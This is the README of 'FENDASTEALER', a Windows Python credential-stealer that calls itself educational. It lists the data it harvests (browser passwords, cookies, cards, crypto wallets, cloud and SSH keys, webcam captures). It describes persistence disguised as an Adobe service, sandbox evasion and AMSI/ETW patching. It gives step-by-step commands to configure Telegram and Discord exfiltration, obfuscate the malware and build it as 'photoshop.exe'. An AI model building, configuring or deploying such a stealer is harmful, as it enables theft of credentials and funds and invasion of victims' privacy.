<div align="center">

# FENDASTEALER

**Windows information-stealer — educational security research project**

[![Python](https://img.shields.io/badge/Python-3.13-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)]()
[![License](https://img.shields.io/github/license/MtxTheus1/fendastealer?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/MtxTheus1/fendastealer?style=for-the-badge)](https://github.com/MtxTheus1/fendastealer)
[![Forks](https://img.shields.io/github/forks/MtxTheus1/fendastealer?style=for-the-badge)](https://github.com/MtxTheus1/fendastealer)
[![Issues](https://img.shields.io/github/issues/MtxTheus1/fendastealer?style=for-the-badge)](https://github.com/MtxTheus1/fendastealer)
[![Educational Only](https://img.shields.io/badge/Educational-Only-red?style=for-the-badge)]()
[![Author](https://img.shields.io/badge/Author-MtxTheus1-blue?style=for-the-badge)](https://github.com/MtxTheus1)

</div>

---

> ## ⚠️ LEGAL DISCLAIMER — READ FIRST
>
> **This project is provided strictly for EDUCATIONAL and defensive-security research.**
> It demonstrates how credential-stealing malware works on Windows so that defenders,
> malware analysts and students can understand the techniques: persistence, sandbox
> evasion, data collection and exfiltration.
>
> * Using this code against any system **without explicit written authorization is a crime**
>   in most jurisdictions (Computer Fraud and Abuse Act, GDPR, Lei Carolina Dieckmann — Brazil,
>   etc.).
> * The author assumes **zero liability** for any misuse. You are responsible for everything
>   you do with this code.
> * **Never upload builds with real exfiltration tokens** to VirusTotal or any public place.
>
> If you are a blue-teamer: this is a safe, readable reference of "how the bad ones work".

---

## What is this?

`fendastealer.py` is a **Windows-only, single-file Python stealer** written to be easy to read
and study. It collects browser credentials and session data, system information, WiFi keys,
developer/cloud credentials and more, packages everything into a ZIP, and exfiltrates it
through a configurable channel (Telegram bot → GoFile → Discord webhook fallback).

It runs **without administrator rights** — elevation only enables *extra* capabilities.

## Collected data

| Category | Details |
|---|---|
| Browsers (Chromium + Firefox) | passwords, cookies, credit cards, history, downloads, crypto-wallet extensions |
| Chat / gaming sessions | Discord tokens (+billing/nitro), Roblox cookies (`.ROBLOSECURITY`) |
| Desktop wallets | Exodus, Atomic, Binance, Electrum, MetaMask profiles, Ledger/Trezor suites, +40 more |
| System | OS info, public/local IP, RAM/CPU/disk, running processes, network connections, installed software, **Windows product key**, printers, proxy & env secrets |
| Network | **saved WiFi networks + passwords** (`netsh wlan`), ARP/connections |
| Credentials | `cmdkey` (Windows credentials), PowerShell history, saved RDP hosts, local accounts |
| Developer/cloud | `.ssh/`, `.aws/`, gcloud, `.kube/`, `.docker/`, `.gnupg/`, `.netrc`, `.pgpass`, `.npmrc`, `.gitconfig` |
| Messaging/FTP | Telegram `tdata`, FileZilla/WinSCP profiles |
| Artifacts | **screenshot**, **webcam capture**, clipboard text, "interesting files" (Desktop/Downloads/Documents) filtered by keywords (seed phrases, passwords, 2FA, bank…) |

## How it works

```
run
 ├─ strip Mark-of-the-Web
 ├─ persistence (Startup folder + HKCU\...\Run "AdobeUpdateService")   [skipped with --test]
 ├─ sleep 60-150 s  (anti-sandbox; 2-5 s with --test)
 ├─ AMSI/ETW in-memory patches (best effort)
 ├─ admin extras (Defender policy/exclusion, block Task Manager)       [only if elevated]
 ├─ anti-sandbox / anti-debug checks                                   [ignored with --test]
 ├─ collect everything -> SK_<random>.zip
 ├─ exfil: Telegram bot -> GoFile -> Discord webhook (first that works)
 └─ cleanup: remove MOTW + self-destruct (compiled builds only)
```

### Persistence & self-destruct behavior

| Scenario | Behavior |
|---|---|
| First run (any) | copies itself to the Startup folder + adds `AdobeUpdateService` Run key (HKCU) |
| Manual run of the compiled exe | collects, exfiltrates, then **schedules its own deletion** (~3 s after exit) |
| Run from the Startup copy | does **not** delete itself (keeps persistence alive) |
| Run as `.py` / `--test` | no self-destruct, no persistence |

## Project layout

```
fendastealer/
├── src/
│   └── fendastealer.py        # the whole stealer (single file, ~2.2k lines)
├── scripts/
│   ├── build_nuitka.ps1       # Nuitka build (recommended, no PyInstaller fingerprint)
│   └── ms_sign.ps1            # optional code-signing helper (bring your own cert)
├── assets/
│   └── logo.ico               # executable icon
├── requirements.txt           # pinned dependencies
├── .gitignore
├── LICENSE
└── README.md                  # you are here
```

## Getting started (local lab)

> Test **only** on machines you own, in a VM, with a throwaway Telegram bot/webhook.

### 1. Environment

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
pip install -r requirements.txt
pip install nuitka ordered-set zstandard
```

### 2. Configure the exfiltration channel

All network endpoints in the source are obfuscated (base64 of the reversed string) and
decoded only at runtime. The repo ships with **placeholders** — put in your own values:

```powershell
python src\fendastealer.py enc "https://discord.com/api/webhooks/..."   # -> WEBHOOK_ENC
python src\fendastealer.py enc "1234567890:AA...bot-token"              # -> TELEGRAM_TOKEN_ENC
python src\fendastealer.py enc "123456789"                              # -> TELEGRAM_CHAT_ENC
```

Paste the printed values over the placeholders at the bottom of `src/fendastealer.py`
(`WEBHOOK_ENC`, `TELEGRAM_TOKEN_ENC`, `TELEGRAM_CHAT_ENC`). Create the bot with
**@BotFather**, send it a message, and grab your `chat_id` from `getUpdates`.

### 3. Build the executable (Nuitka — recommended)

```powershell
powershell -ExecutionPolicy Bypass -File scripts\build_nuitka.ps1
# output: .\photoshop.exe  (name/icon/version are configurable in the script)
```

Nuitka compiles Python to C — no PyInstaller signature. It auto-downloads the Zig
toolchain on first run. For extra obfuscation, run PyArmor before Nuitka:
`pyarmor gen --pack onefile src\fendastealer.py`.

### 4. Test the pipeline (no persistence, short delay)

```powershell
python src\fendastealer.py --test
```

`--test` skips persistence and sandbox/debugger checks, and prints which sandbox
indicators *would* have fired — useful to learn the anti-analysis logic. Expect the ZIP
in your Telegram chat.

## Anti-analysis & evasion (study notes)

- **Sandbox/VM checks**: known VM DLLs, MAC prefixes (VMware, VirtualBox, QEMU/KVM,
  Hyper-V), low RAM/CPU, boot uptime < 60 s, tiny screen resolution, no user input for 3 h+.
- **Debugger/analysis process blacklist**: x64dbg/IDA/Ghidra/Wireshark/Procmon, sandbox
  tools, etc.
- **Delayed execution** (60–150 s) to outlive short automated detonation windows.
- **AMSI + ETW in-memory patching**, with the patch payload **XOR-encoded at build time**
  so the well-known `B8 57 00 07 80 C3` byte signature does not appear contiguously.
- **String obfuscation** of endpoints, commands (`netsh`, `cmdkey`, …) and keys.
- **Junk "telemetry" code** (`SystemDiagnostics`) interleaved with real modules to break
  sequential heuristics.

**Honest limitations:** no obfuscation gives "100% invisibility". Detection depends on the
final build, target AV/EDR, and runtime behavior. Real-world "FUD" is a moving target —
this repo is for *understanding* the arms race, not for winning it permanently.

## Resources

- [MITRE ATT&CK — T1555 Credentials from Password Stores](https://attack.mitre.org/techniques/T1555/)
- [MITRE ATT&CK — T1056 Input Capture](https://attack.mitre.org/techniques/T1056/)
- [AMSI bypass research](https://amsi.fail/)
- [VirusTotal](https://www.virustotal.com/)

## 📄 License

[MIT](LICENSE) — educational use only. See the disclaimer above.
